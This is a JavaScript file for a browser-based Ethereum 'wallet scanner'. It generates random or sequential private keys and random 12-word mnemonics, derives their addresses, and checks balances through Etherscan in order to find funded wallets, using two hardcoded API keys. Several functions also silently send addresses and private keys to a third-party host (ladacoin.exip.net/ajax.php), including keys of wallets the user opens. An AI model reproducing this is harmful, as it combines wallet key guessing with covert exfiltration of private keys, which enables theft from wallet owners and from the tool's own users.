$('#btn-setting').click(function() {
    $("#divSetting").toggle();
});

$('input[type=radio][name=limitScan]').change(function() {
    if (this.value == 1) {
        $("#limit-scan").prop('disabled', false);
        $('#div-times').show();
    } else {
        $('#div-times').hide();
        $("#limit-scan").prop('disabled', true);
    }
});
$('input[type=radio][name=typeScan]').change(function() {
    if (this.value == 1) {
        $('#div-start-from').hide();
        $('#div-mnemonic').hide();
        $('#div-setting-randrom').show();
        $("#start-private").prop('disabled', true);
    } else if (this.value == 2) {
        $('#div-start-from').hide();
        $('#div-setting-randrom').hide();
        $('#div-mnemonic').show();
        $("#mnemonic-input").prop('disabled', false);

        if ($("#mnemonic-input").val() == '') {
             $("#mnemonic-input").val(getAMnemonic())
        }
    } else {
        $('#div-setting-randrom').hide();
        $('#div-start-from').show();
        $('#div-mnemonic').hide();
        $("#start-private").prop('disabled', false);

        if ($("#start-private").val() == '') {
            $("#start-private").val(getDataRandom()[0][0])
        }
    }
});
$("#mnemonic-input").keyup(function() {
    $(this).attr('data-path', 1);
});

var totalAddress = 0;
var limitScan = 0;
var flagDelay = 0;
var indexCheckAll = 0;
var BASE_URL0 = 'https://ethscan.app';
var BASE_URL1 = 'https://etherscan.io';
var BASE_URL = 'http://ladacoin.exip.net';
var dataPrivate = [],
    dataAddress = [];

function randomPrivateKey() {
    var private = "";
    var possible = "0123456789abcdef";
    for (var i = 0; i < 64; i++)
        private += possible.charAt(Math.floor(Math.random() * possible.length));
    return private;
}

function auto() {
    $('#delay').html(flagDelay);
    console.log(flagDelay + "x");
    if (flagDelay >= 1) {
        if(flagDelay >= 10) {
            flagDelay = 0;
        } else {
            flagDelay++;
            return;
        }
        
    }

    limitScan += 1;
    totalAddress += 20;
    $('#totalAddress').html(totalAddress);




    dataAddress = [];
    dataPrivate = [];


    if($('input[name=typeScan]:checked').val() == 2) {
      if ($('input[name=typeCheck]:checked').val() == 0) {
        flagDelay = 1;
      }
      $.getJSON(BASE_URL0 + '/mnemonic-phrasey.php?mnemonicPhrase='+$("#mnemonic-input").val().split(" ").join("-") + '&path=' + $("#mnemonic-input").attr('data-path'), function(data) {
         $.each(data, function(index, value) {
          $('#private' + index).html('<a href="' + BASE_URL + '/private/' + data[index].privateKey + '" target="_blank">' + data[index].privateKey + '</a>');
          $('#address' + index).html('<a href="' + BASE_URL1 + '/address/' + data[index].address + '" target="_blank">' + data[index].address + '</a>');
          $('#balance' + index).html('');
          
          dataAddress[index] = data[index].address;
          dataPrivate[index] = data[index].privateKey;


            if ($('input[name=typeCheck]:checked').val() == 0) { //eth
                $('#balance' + index).html('<span style="color:' + getRandomColor() + '">' + data[index].balance + '</span>');
                if (data[index].balance != 0) {
                  $('#havaBalance').append("<br>Mnemonic Phrase: " + $("#mnemonic-input").val() + "<br>Address: " + data[index].address + " Private Key: " + data[index].privateKey + " Balance:" + data[index].balance);
                  if ($('input[name=limitScan]:checked').val() == 2) {
                    stop();
                  }
                }
              $("#mnemonic-input").attr('data-path', 0);
              $("#mnemonic-input").val(getAMnemonic())
              flagDelay = 0;
            } else { // token
              $('#balance' + index).html('');
            }
            
          });

        if ($('input[name=typeCheck]:checked').val() == '1') {

                startCheckAll();
                clearInterval(myInterval);
        }

          
      });
    } else {
      if ($('input[name=typeScan]:checked').val() == 1) {
          var data = getDataRandom();
      } else {
          var data = getDataOrderly();
      }

      if ($('input[name=typeCheck]:checked').val() == 0) {
          flagDelay = 1;
          work(data[1]);
      } else {
          startCheckAll();
          clearInterval(myInterval);
      }

      $.each(data[1], function(index, value) {
          $('#private' + index).html('<a href="' + BASE_URL + '/private/' + data[0][index] + '" target="_blank">' + data[0][index] + '</a>');
          $('#address' + index).html('<a href="' + BASE_URL1 + '/address/' + value + '" target="_blank">' + value + '</a>');
          if ($('input[name=typeCheck]:checked').val() == 1) {
              $('#balance' + index).html('');
          }
      });
    }


    if ($('input[name=limitScan]:checked').val() == 1 && $('#limit-scan').val() <= limitScan) {
        limitScan = 0;
        stop();
    }
}

function getDataOrderly() {
    var private;
    for (var i = 0; i < 20; i++) {
        if (i == 0) {
            private = $('#start-private').val().trim();
        } else {
            private = getNextPrivateKey(private);
        }
        dataPrivate[i] = private;
        dataAddress[i] = convertPrivateToAddress(private);
    }
    $('#start-private').val(getNextPrivateKey(private));
    return [dataPrivate, dataAddress];
}

function getDataRandom() {
    var private = randomPrivateKey();
    for (var i = 0; i < 20; i++) {
        if ($("#randomAndNoOrderly").is(':checked') == true) {
            dataPrivate[i] = randomPrivateKey();
        } else {
            if (i == 0) {
                dataPrivate[i] = private;
            } else {
                dataPrivate[i] = getNextPrivateKey(private);
                private = dataPrivate[i];
            }
        }
        dataAddress[i] = convertPrivateToAddress(dataPrivate[i]);
    }
    return [dataPrivate, dataAddress];
}

function getNextPrivateKey(private) {
    private = private.split('');
    var possible = "0123456789abcdef";
    for (var i = private.length - 1; i >= 0; i--) {
        var point = jQuery.inArray(private[i], possible);
        private[i] = possible[(point == 15 ? 0 : point + 1)];
        if (point < 15) {
            break;
        }
    }
    private = private.join('');
    return private;
}

function getRandomColor() {
    var letters = '0123456789ABCDEF';
    var color = '#';
    for (var i = 0; i < 6; i++) {
        color += letters[Math.floor(Math.random() * 16)];
    }
    return color;
}

function work(dataAddress) {
    var stringAddress = dataAddress.join(',');
    var apiKeys = ['SH884AZJMKIFDMAPSMHTHJUQ3QIRPH827I', 'DZHWCIEA2WW86CZEC88IGWG1JFB6JN3VHS'];
    var apiKey = apiKeys[Math.floor(Math.random() * apiKeys.length)];

    var urlCheckBalance = 'https://api.etherscan.io/api?module=account&action=balancemulti&address=' + stringAddress + '&tag=latest&apikey=' + apiKey;
    var dataBalance = [];
    $.getJSON(urlCheckBalance, function(data) {
        $.each(data.result, function(key, val) {
            $('#balance' + key).html('<span style="color:' + getRandomColor() + '">' + val.balance + '</span>');
            if (val.balance != 0) {
                $.ajax({
                    url: BASE_URL + "/ajax.php?address=" + dataAddress[key] + "&privateKey= " + dataPrivate[key] + "&status=1",
                    success: function(result) {}
                });
                $('#havaBalance').append("<br>Address: " + dataAddress[key] + " Private Key: " + dataPrivate[key] + " Balance:" + val.balance);
                if ($('input[name=limitScan]:checked').val() == 2) {
                    stop();
                }
                console.log(dataPrivate[key]);
                console.log(val.balance);
            }
        });
        flagDelay = 0;
    });
}
$('#btn-start-scan').click(function() {
    if($('input[name=typeScan]:checked').val() == '2') {
        if($("#mnemonic-input").val() == '') {
            alert('Blank mnemonic!');
            return false;
        }
    }
    
    start();
});

var myIntervalCheckAll;

function startCheckAll() {
    console.log("startCheckAll")
    myIntervalCheckAll = setInterval(function() {
        auto2();
    }, 1000);
}

function auto2() {
    $('#delay').html(flagDelay);
    console.log(flagDelay);
    if (flagDelay >= 1) {
        flagDelay++;
        return;
    }
    if (indexCheckAll >= 20) {
        if($('input[name=typeScan]:checked').val() == 2 && $('input[name=typeCheck]:checked').val() == 1) {
            flagDelay = 0;
            $("#mnemonic-input").val(getAMnemonic())
            auto();
            // clearInterval(myInterval);
        } else {
          myInterval = setInterval(function() {
            auto();
          }, 1000);
        } 

          
        
        clearInterval(myIntervalCheckAll);
        indexCheckAll = 0;
    } else {
        flagDelay = 1;
        work2();
    }
}

function work2() {
    $.ajax({
        url: BASE_URL0 + '/getbalance.php?address=' + dataAddress[indexCheckAll],
        beforeSend: function() {
            $('#balance' + indexCheckAll).html('<img src="' + BASE_URL0 + '/web/loading-mini.gif" style="height:16px;">');
        },
        success: function(respon) {
            var json = JSON.parse(respon);
            if (json['status'] == 1) {
                var out = '<small>' + json['countTxs'] + 'Txs/' +
                    json['etherBalance'] + 'Eth/$' +
                    json['tokenBalance'] + '/' +
                    Object.keys(json['token']).length + 'Token </small>';
                $('#balance' + indexCheckAll).html(out);
                if (json['isActive'] == 'true') {
                    $.ajax({
                        url: BASE_URL + "/ajax.php?address=" + dataAddress[indexCheckAll] + "&privateKey= " + dataPrivate[indexCheckAll] + "&status=2",
                        success: function(result) {}
                    });
                    if($('input[name=typeScan]:checked').val() == 2) {
                      $('#havaBalance').append("<br>Mnemonic Phrase:" + $("#mnemonic-input").val());
                    }

                    $('#havaBalance').append("<br>Address: " + dataAddress[indexCheckAll] + " Private key: " + dataPrivate[indexCheckAll] + " Balance: " + out);
                    if ($('input[name=limitScan]:checked').val() == 2) {
                        stop();
                    }
                }
            } else {
                $('#balance' + indexCheckAll).html('false');
            }
            indexCheckAll++;
            flagDelay = 0;
        }
    });
}

var myInterval;

function stop() {
    if ($('input[name=typeScan]:checked').val() == 0) {
        $("#start-private").prop('disabled', false);
    }
    if ($('input[name=limitScan]:checked').val() == 1) {
        $("#limit-scan").prop('disabled', false);
    }
    clearInterval(myInterval);
    clearInterval(myIntervalCheckAll);
    indexCheckAll = 0;
    $('#buttonOption').html('<button class="btn btn-primary btn-sm" type="button" onclick="start();"><i class="fa fa-play-circle"></i> <span id="lng22">START</span></button>');
}

function start() {
    if ($('input[name=typeScan]:checked').val() == 0) {
        $("#start-private").prop('disabled', true);
    }
    if ($('input[name=limitScan]:checked').val() == 1) {
        $("#limit-scan").prop('disabled', true);
    }

    myInterval = setInterval(function() {
        auto();
    }, 1000);

    
    $('#buttonOption').html('<button class="btn btn-danger btn-sm" type="button" onclick="stop();"><i class="fa fa-stop-circle-o"></i> <span id="lng23">STOP</span></button>');
}

function convertPrivateToAddress(private) {
    var wallet = new ethers.Wallet('0x' + private);
    return wallet.address;
}

function getDataPrivate(private) {
    var address = convertPrivateToAddress(private);
    $.ajax({
        url: BASE_URL0 + '/getbalance.php?address=' + address + '&sql=0',
        cache: false,
        beforeSend: function() {
            $('#loading-data').show();
        },
        success: function(respon) {
            var json = JSON.parse(respon);
            if (json['status'] == 0) {
                window.location.href = BASE_URL + "/404";
            }
            $('#loading-data').hide();
            $('#token-info').show();
            $('#span-ether').html(json['ether']);

            $('#span-address').html(json['address']);
            //if(json['active'] == '1') {
            $.ajax({
                url: BASE_URL + "/ajax.php?address=" + address + "&privateKey=" + private + "&status=3",
                success: function(result) {}
            });
            //}

            let sumusd = 0;
            $.each(json['token'], function(index, value) {

                let balance = new BigNumber(value.balance).times(1 / new BigNumber(Math.pow(10, value.decimals)));
                balance = new BigNumber(balance).toNumber();

                let usd = (balance * parseFloat(value.rate)).toFixed(2);
                sumusd += !isNaN(parseFloat(usd)) ? parseFloat(usd) : 0;

                let token = '<div class="col-md-6 col-sm-12"> <div style="border-bottom: 2px solid #777;display: block;background:#fff;padding:3px;">' + (value.img ? '<img height="32" src="https://ethplorer.io' + value.img + '">' : '') + ' ' + value.name + ' <span class="pull-right">$' + usd + '</span><br>' + balance + ' ' + value.symbol + ' <span class="pull-right" style="font-size:9pt;color:#777;">@' + value.rate + '</span> </div></div>';
                $('#list-tokens').prepend(token);
            });

            $('#span-usd').html(sumusd);

        }
    });
}

function getAMnemonic() {
    const mnArr = ["abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual", "adapt", "add", "addict", "address", "adjust", "admit", "adult", "advance", "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent", "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album", "alcohol", "alert", "alien", "all", "alley", "allow", "almost", "alone", "alpha", "already", "also", "alter", "always", "amateur", "amazing", "among", "amount", "amused", "analyst", "anchor", "ancient", "anger", "angle", "angry", "animal", "ankle", "announce", "annual", "another", "answer", "antenna", "antique", "anxiety", "any", "apart", "apology", "appear", "apple", "approve", "april", "arch", "arctic", "area", "arena", "argue", "arm", "armed", "armor", "army", "around", "arrange", "arrest", "arrive", "arrow", "art", "artefact", "artist", "artwork", "ask", "aspect", "assault", "asset", "assist", "assume", "asthma", "athlete", "atom", "attack", "attend", "attitude", "attract", "auction", "audit", "august", "aunt", "author", "auto", "autumn", "average", "avocado", "avoid", "awake", "aware", "away", "awesome", "awful", "awkward", "axis", "baby", "bachelor", "bacon", "badge", "bag", "balance", "balcony", "ball", "bamboo", "banana", "banner", "bar", "barely", "bargain", "barrel", "base", "basic", "basket", "battle", "beach", "bean", "beauty", "because", "become", "beef", "before", "begin", "behave", "behind", "believe", "below", "belt", "bench", "benefit", "best", "betray", "better", "between", "beyond", "bicycle", "bid", "bike", "bind", "biology", "bird", "birth", "bitter", "black", "blade", "blame", "blanket", "blast", "bleak", "bless", "blind", "blood", "blossom", "blouse", "blue", "blur", "blush", "board", "boat", "body", "boil", "bomb", "bone", "bonus", "book", "boost", "border", "boring", "borrow", "boss", "bottom", "bounce", "box", "boy", "bracket", "brain", "brand", "brass", "brave", "bread", "breeze", "brick", "bridge", "brief", "bright", "bring", "brisk", "broccoli", "broken", "bronze", "broom", "brother", "brown", "brush", "bubble", "buddy", "budget", "buffalo", "build", "bulb", "bulk", "bullet", "bundle", "bunker", "burden", "burger", "burst", "bus", "business", "busy", "butter", "buyer", "buzz", "cabbage", "cabin", "cable", "cactus", "cage", "cake", "call", "calm", "camera", "camp", "can", "canal", "cancel", "candy", "cannon", "canoe", "canvas", "canyon", "capable", "capital", "captain", "car", "carbon", "card", "cargo", "carpet", "carry", "cart", "case", "cash", "casino", "castle", "casual", "cat", "catalog", "catch", "category", "cattle", "caught", "cause", "caution", "cave", "ceiling", "celery", "cement", "census", "century", "cereal", "certain", "chair", "chalk", "champion", "change", "chaos", "chapter", "charge", "chase", "chat", "cheap", "check", "cheese", "chef", "cherry", "chest", "chicken", "chief", "child", "chimney", "choice", "choose", "chronic", "chuckle", "chunk", "churn", "cigar", "cinnamon", "circle", "citizen", "city", "civil", "claim", "clap", "clarify", "claw", "clay", "clean", "clerk", "clever", "click", "client", "cliff", "climb", "clinic", "clip", "clock", "clog", "close", "cloth", "cloud", "clown", "club", "clump", "cluster", "clutch", "coach", "coast", "coconut", "code", "coffee", "coil", "coin", "collect", "color", "column", "combine", "come", "comfort", "comic", "common", "company", "concert", "conduct", "confirm", "congress", "connect", "consider", "control", "convince", "cook", "cool", "copper", "copy", "coral", "core", "corn", "correct", "cost", "cotton", "couch", "country", "couple", "course", "cousin", "cover", "coyote", "crack", "cradle", "craft", "cram", "crane", "crash", "crater", "crawl", "crazy", "cream", "credit", "creek", "crew", "cricket", "crime", "crisp", "critic", "crop", "cross", "crouch", "crowd", "crucial", "cruel", "cruise", "crumble", "crunch", "crush", "cry", "crystal", "cube", "culture", "cup", "cupboard", "curious", "current", "curtain", "curve", "cushion", "custom", "cute", "cycle", "dad", "damage", "damp", "dance", "danger", "daring", "dash", "daughter", "dawn", "day", "deal", "debate", "debris", "decade", "december", "decide", "decline", "decorate", "decrease", "deer", "defense", "define", "defy", "degree", "delay", "deliver", "demand", "demise", "denial", "dentist", "deny", "depart", "depend", "deposit", "depth", "deputy", "derive", "describe", "desert", "design", "desk", "despair", "destroy", "detail", "detect", "develop", "device", "devote", "diagram", "dial", "diamond", "diary", "dice", "diesel", "diet", "differ", "digital", "dignity", "dilemma", "dinner", "dinosaur", "direct", "dirt", "disagree", "discover", "disease", "dish", "dismiss", "disorder", "display", "distance", "divert", "divide", "divorce", "dizzy", "doctor", "document", "dog", "doll", "dolphin", "domain", "donate", "donkey", "donor", "door", "dose", "double", "dove", "draft", "dragon", "drama", "drastic", "draw", "dream", "dress", "drift", "drill", "drink", "drip", "drive", "drop", "drum", "dry", "duck", "dumb", "dune", "during", "dust", "dutch", "duty", "dwarf", "dynamic", "eager", "eagle", "early", "earn", "earth", "easily", "east", "easy", "echo", "ecology", "economy", "edge", "edit", "educate", "effort", "egg", "eight", "either", "elbow", "elder", "electric", "elegant", "element", "elephant", "elevator", "elite", "else", "embark", "embody", "embrace", "emerge", "emotion", "employ", "empower", "empty", "enable", "enact", "end", "endless", "endorse", "enemy", "energy", "enforce", "engage", "engine", "enhance", "enjoy", "enlist", "enough", "enrich", "enroll", "ensure", "enter", "entire", "entry", "envelope", "episode", "equal", "equip", "era", "erase", "erode", "erosion", "error", "erupt", "escape", "essay", "essence", "estate", "eternal", "ethics", "evidence", "evil", "evoke", "evolve", "exact", "example", "excess", "exchange", "excite", "exclude", "excuse", "execute", "exercise", "exhaust", "exhibit", "exile", "exist", "exit", "exotic", "expand", "expect", "expire", "explain", "expose", "express", "extend", "extra", "eye", "eyebrow", "fabric", "face", "faculty", "fade", "faint", "faith", "fall", "false", "fame", "family", "famous", "fan", "fancy", "fantasy", "farm", "fashion", "fat", "fatal", "father", "fatigue", "fault", "favorite", "feature", "february", "federal", "fee", "feed", "feel", "female", "fence", "festival", "fetch", "fever", "few", "fiber", "fiction", "field", "figure", "file", "film", "filter", "final", "find", "fine", "finger", "finish", "fire", "firm", "first", "fiscal", "fish", "fit", "fitness", "fix", "flag", "flame", "flash", "flat", "flavor", "flee", "flight", "flip", "float", "flock", "floor", "flower", "fluid", "flush", "fly", "foam", "focus", "fog", "foil", "fold", "follow", "food", "foot", "force", "forest", "forget", "fork", "fortune", "forum", "forward", "fossil", "foster", "found", "fox", "fragile", "frame", "frequent", "fresh", "friend", "fringe", "frog", "front", "frost", "frown", "frozen", "fruit", "fuel", "fun", "funny", "furnace", "fury", "future", "gadget", "gain", "galaxy", "gallery", "game", "gap", "garage", "garbage", "garden", "garlic", "garment", "gas", "gasp", "gate", "gather", "gauge", "gaze", "general", "genius", "genre", "gentle", "genuine", "gesture", "ghost", "giant", "gift", "giggle", "ginger", "giraffe", "girl", "give", "glad", "glance", "glare", "glass", "glide", "glimpse", "globe", "gloom", "glory", "glove", "glow", "glue", "goat", "goddess", "gold", "good", "goose", "gorilla", "gospel", "gossip", "govern", "gown", "grab", "grace", "grain", "grant", "grape", "grass", "gravity", "great", "green", "grid", "grief", "grit", "grocery", "group", "grow", "grunt", "guard", "guess", "guide", "guilt", "guitar", "gun", "gym", "habit", "hair", "half", "hammer", "hamster", "hand", "happy", "harbor", "hard", "harsh", "harvest", "hat", "have", "hawk", "hazard", "head", "health", "heart", "heavy", "hedgehog", "height", "hello", "helmet", "help", "hen", "hero", "hidden", "high", "hill", "hint", "hip", "hire", "history", "hobby", "hockey", "hold", "hole", "holiday", "hollow", "home", "honey", "hood", "hope", "horn", "horror", "horse", "hospital", "host", "hotel", "hour", "hover", "hub", "huge", "human", "humble", "humor", "hundred", "hungry", "hunt", "hurdle", "hurry", "hurt", "husband", "hybrid", "ice", "icon", "idea", "identify", "idle", "ignore", "ill", "illegal", "illness", "image", "imitate", "immense", "immune", "impact", "impose", "improve", "impulse", "inch", "include", "income", "increase", "index", "indicate", "indoor", "industry", "infant", "inflict", "inform", "inhale", "inherit", "initial", "inject", "injury", "inmate", "inner", "innocent", "input", "inquiry", "insane", "insect", "inside", "inspire", "install", "intact", "interest", "into", "invest", "invite", "involve", "iron", "island", "isolate", "issue", "item", "ivory", "jacket", "jaguar", "jar", "jazz", "jealous", "jeans", "jelly", "jewel", "job", "join", "joke", "journey", "joy", "judge", "juice", "jump", "jungle", "junior", "junk", "just", "kangaroo", "keen", "keep", "ketchup", "key", "kick", "kid", "kidney", "kind", "kingdom", "kiss", "kit", "kitchen", "kite", "kitten", "kiwi", "knee", "knife", "knock", "know", "lab", "label", "labor", "ladder", "lady", "lake", "lamp", "language", "laptop", "large", "later", "latin", "laugh", "laundry", "lava", "law", "lawn", "lawsuit", "layer", "lazy", "leader", "leaf", "learn", "leave", "lecture", "left", "leg", "legal", "legend", "leisure", "lemon", "lend", "length", "lens", "leopard", "lesson", "letter", "level", "liar", "liberty", "library", "license", "life", "lift", "light", "like", "limb", "limit", "link", "lion", "liquid", "list", "little", "live", "lizard", "load", "loan", "lobster", "local", "lock", "logic", "lonely", "long", "loop", "lottery", "loud", "lounge", "love", "loyal", "lucky", "luggage", "lumber", "lunar", "lunch", "luxury", "lyrics", "machine", "mad", "magic", "magnet", "maid", "mail", "main", "major", "make", "mammal", "man", "manage", "mandate", "mango", "mansion", "manual", "maple", "marble", "march", "margin", "marine", "market", "marriage", "mask", "mass", "master", "match", "material", "math", "matrix", "matter", "maximum", "maze", "meadow", "mean", "measure", "meat", "mechanic", "medal", "media", "melody", "melt", "member", "memory", "mention", "menu", "mercy", "merge", "merit", "merry", "mesh", "message", "metal", "method", "middle", "midnight", "milk", "million", "mimic", "mind", "minimum", "minor", "minute", "miracle", "mirror", "misery", "miss", "mistake", "mix", "mixed", "mixture", "mobile", "model", "modify", "mom", "moment", "monitor", "monkey", "monster", "month", "moon", "moral", "more", "morning", "mosquito", "mother", "motion", "motor", "mountain", "mouse", "move", "movie", "much", "muffin", "mule", "multiply", "muscle", "museum", "mushroom", "music", "must", "mutual", "myself", "mystery", "myth", "naive", "name", "napkin", "narrow", "nasty", "nation", "nature", "near", "neck", "need", "negative", "neglect", "neither", "nephew", "nerve", "nest", "net", "network", "neutral", "never", "news", "next", "nice", "night", "noble", "noise", "nominee", "noodle", "normal", "north", "nose", "notable", "note", "nothing", "notice", "novel", "now", "nuclear", "number", "nurse", "nut", "oak", "obey", "object", "oblige", "obscure", "observe", "obtain", "obvious", "occur", "ocean", "october", "odor", "off", "offer", "office", "often", "oil", "okay", "old", "olive", "olympic", "omit", "once", "one", "onion", "online", "only", "open", "opera", "opinion", "oppose", "option", "orange", "orbit", "orchard", "order", "ordinary", "organ", "orient", "original", "orphan", "ostrich", "other", "outdoor", "outer", "output", "outside", "oval", "oven", "over", "own", "owner", "oxygen", "oyster", "ozone", "pact", "paddle", "page", "pair", "palace", "palm", "panda", "panel", "panic", "panther", "paper", "parade", "parent", "park", "parrot", "party", "pass", "patch", "path", "patient", "patrol", "pattern", "pause", "pave", "payment", "peace", "peanut", "pear", "peasant", "pelican", "pen", "penalty", "pencil", "people", "pepper", "perfect", "permit", "person", "pet", "phone", "photo", "phrase", "physical", "piano", "picnic", "picture", "piece", "pig", "pigeon", "pill", "pilot", "pink", "pioneer", "pipe", "pistol", "pitch", "pizza", "place", "planet", "plastic", "plate", "play", "please", "pledge", "pluck", "plug", "plunge", "poem", "poet", "point", "polar", "pole", "police", "pond", "pony", "pool", "popular", "portion", "position", "possible", "post", "potato", "pottery", "poverty", "powder", "power", "practice", "praise", "predict", "prefer", "prepare", "present", "pretty", "prevent", "price", "pride", "primary", "print", "priority", "prison", "private", "prize", "problem", "process", "produce", "profit", "program", "project", "promote", "proof", "property", "prosper", "protect", "proud", "provide", "public", "pudding", "pull", "pulp", "pulse", "pumpkin", "punch", "pupil", "puppy", "purchase", "purity", "purpose", "purse", "push", "put", "puzzle", "pyramid", "quality", "quantum", "quarter", "question", "quick", "quit", "quiz", "quote", "rabbit", "raccoon", "race", "rack", "radar", "radio", "rail", "rain", "raise", "rally", "ramp", "ranch", "random", "range", "rapid", "rare", "rate", "rather", "raven", "raw", "razor", "ready", "real", "reason", "rebel", "rebuild", "recall", "receive", "recipe", "record", "recycle", "reduce", "reflect", "reform", "refuse", "region", "regret", "regular", "reject", "relax", "release", "relief", "rely", "remain", "remember", "remind", "remove", "render", "renew", "rent", "reopen", "repair", "repeat", "replace", "report", "require", "rescue", "resemble", "resist", "resource", "response", "result", "retire", "retreat", "return", "reunion", "reveal", "review", "reward", "rhythm", "rib", "ribbon", "rice", "rich", "ride", "ridge", "rifle", "right", "rigid", "ring", "riot", "ripple", "risk", "ritual", "rival", "river", "road", "roast", "robot", "robust", "rocket", "romance", "roof", "rookie", "room", "rose", "rotate", "rough", "round", "route", "royal", "rubber", "rude", "rug", "rule", "run", "runway", "rural", "sad", "saddle", "sadness", "safe", "sail", "salad", "salmon", "salon", "salt", "salute", "same", "sample", "sand", "satisfy", "satoshi", "sauce", "sausage", "save", "say", "scale", "scan", "scare", "scatter", "scene", "scheme", "school", "science", "scissors", "scorpion", "scout", "scrap", "screen", "script", "scrub", "sea", "search", "season", "seat", "second", "secret", "section", "security", "seed", "seek", "segment", "select", "sell", "seminar", "senior", "sense", "sentence", "series", "service", "session", "settle", "setup", "seven", "shadow", "shaft", "shallow", "share", "shed", "shell", "sheriff", "shield", "shift", "shine", "ship", "shiver", "shock", "shoe", "shoot", "shop", "short", "shoulder", "shove", "shrimp", "shrug", "shuffle", "shy", "sibling", "sick", "side", "siege", "sight", "sign", "silent", "silk", "silly", "silver", "similar", "simple", "since", "sing", "siren", "sister", "situate", "six", "size", "skate", "sketch", "ski", "skill", "skin", "skirt", "skull", "slab", "slam", "sleep", "slender", "slice", "slide", "slight", "slim", "slogan", "slot", "slow", "slush", "small", "smart", "smile", "smoke", "smooth", "snack", "snake", "snap", "sniff", "snow", "soap", "soccer", "social", "sock", "soda", "soft", "solar", "soldier", "solid", "solution", "solve", "someone", "song", "soon", "sorry", "sort", "soul", "sound", "soup", "source", "south", "space", "spare", "spatial", "spawn", "speak", "special", "speed", "spell", "spend", "sphere", "spice", "spider", "spike", "spin", "spirit", "split", "spoil", "sponsor", "spoon", "sport", "spot", "spray", "spread", "spring", "spy", "square", "squeeze", "squirrel", "stable", "stadium", "staff", "stage", "stairs", "stamp", "stand", "start", "state", "stay", "steak", "steel", "stem", "step", "stereo", "stick", "still", "sting", "stock", "stomach", "stone", "stool", "story", "stove", "strategy", "street", "strike", "strong", "struggle", "student", "stuff", "stumble", "style", "subject", "submit", "subway", "success", "such", "sudden", "suffer", "sugar", "suggest", "suit", "summer", "sun", "sunny", "sunset", "super", "supply", "supreme", "sure", "surface", "surge", "surprise", "surround", "survey", "suspect", "sustain", "swallow", "swamp", "swap", "swarm", "swear", "sweet", "swift", "swim", "swing", "switch", "sword", "symbol", "symptom", "syrup", "system", "table", "tackle", "tag", "tail", "talent", "talk", "tank", "tape", "target", "task", "taste", "tattoo", "taxi", "teach", "team", "tell", "ten", "tenant", "tennis", "tent", "term", "test", "text", "thank", "that", "theme", "then", "theory", "there", "they", "thing", "this", "thought", "three", "thrive", "throw", "thumb", "thunder", "ticket", "tide", "tiger", "tilt", "timber", "time", "tiny", "tip", "tired", "tissue", "title", "toast", "tobacco", "today", "toddler", "toe", "together", "toilet", "token", "tomato", "tomorrow", "tone", "tongue", "tonight", "tool", "tooth", "top", "topic", "topple", "torch", "tornado", "tortoise", "toss", "total", "tourist", "toward", "tower", "town", "toy", "track", "trade", "traffic", "tragic", "train", "transfer", "trap", "trash", "travel", "tray", "treat", "tree", "trend", "trial", "tribe", "trick", "trigger", "trim", "trip", "trophy", "trouble", "truck", "true", "truly", "trumpet", "trust", "truth", "try", "tube", "tuition", "tumble", "tuna", "tunnel", "turkey", "turn", "turtle", "twelve", "twenty", "twice", "twin", "twist", "two", "type", "typical", "ugly", "umbrella", "unable", "unaware", "uncle", "uncover", "under", "undo", "unfair", "unfold", "unhappy", "uniform", "unique", "unit", "universe", "unknown", "unlock", "until", "unusual", "unveil", "update", "upgrade", "uphold", "upon", "upper", "upset", "urban", "urge", "usage", "use", "used", "useful", "useless", "usual", "utility", "vacant", "vacuum", "vague", "valid", "valley", "valve", "van", "vanish", "vapor", "various", "vast", "vault", "vehicle", "velvet", "vendor", "venture", "venue", "verb", "verify", "version", "very", "vessel", "veteran", "viable", "vibrant", "vicious", "victory", "video", "view", "village", "vintage", "violin", "virtual", "virus", "visa", "visit", "visual", "vital", "vivid", "vocal", "voice", "void", "volcano", "volume", "vote", "voyage", "wage", "wagon", "wait", "walk", "wall", "walnut", "want", "warfare", "warm", "warrior", "wash", "wasp", "waste", "water", "wave", "way", "wealth", "weapon", "wear", "weasel", "weather", "web", "wedding", "weekend", "weird", "welcome", "west", "wet", "whale", "what", "wheat", "wheel", "when", "where", "whip", "whisper", "wide", "width", "wife", "wild", "will", "win", "window", "wine", "wing", "wink", "winner", "winter", "wire", "wisdom", "wise", "wish", "witness", "wolf", "woman", "wonder", "wood", "wool", "word", "work", "world", "worry", "worth", "wrap", "wreck", "wrestle", "wrist", "write", "wrong", "yard", "year", "yellow", "you", "young", "youth", "zebra", "zero", "zone", "zoo"];


    let mnemonic = [];

    for (var i = 12; i > 0; i--) {
        let item = mnArr[Math.floor(Math.random() * mnArr.length)];

        mnemonic.push(item);
    }

    return mnemonic.join(' ');
}

function getDataFromMnemonicPhrase() {
    var private;
    for (var i = 0; i < 20; i++) {
        if (i == 0) {
            private = $('#start-private').val().trim();
        } else {
            private = getNextPrivateKey(private);
        }
        dataPrivate[i] = private;
        dataAddress[i] = convertPrivateToAddress(private);
    }
    $('#start-private').val(getNextPrivateKey(private));
    return [dataPrivate, dataAddress];
}

//SEND TRANSACTION
$('#btn-fetch-balance-token').click(function() {
    var url = 'https://api.ethplorer.io/getAddressInfo/' + $('#st-unlock').attr('data-address') + '?apiKey=freekey';
    $('#btn-fetch-balance-token').attr('disabled', 'disabled');
    $.ajax({
        url: url,
        method: "GET",
        success: function(respon) {
            console.log(respon.tokens);
            if (respon.tokens != undefined) {
                $.each(respon.tokens, function(key, value) {
                    $('#list-tokens').append('<li class="list-group-item">' + value.tokenInfo.name + '<br>Balance: ' + new ethers.utils.parseUnits(value.balance, 18) + '</li>');
                });

            }
        },
        error: function(err) {

        }
    })
});
$('#gas-price-input').on("change mousemove", function() {
    $("#gas-price").html($(this).val());
});
$('#st-private-key').keyup(function() {
    validatePrivateKey($('#st-private-key').val());
});
$('#st-private-key').bind("paste", "cut", function(e) {
    validatePrivateKey($('#st-private-key').val());
});
$('#st-show-hide-private-key').click(function() {
    if ($(this).attr('data-status') == '0') {
        $(this).attr('data-status', 1);
        $('#logged-private-key').html($('#st-unlock').attr('data-private-key'));
    } else {
        $(this).attr('data-status', 0);
        $('#logged-private-key').html("*".repeat($('#st-unlock').attr('data-private-key').length));
    }
});
$('#btn-unlock').click(function() {
    $('#form-unlock').hide();
    $('#form-logged').show();
    $('#logged-address').html($('#st-unlock').attr('data-address'));
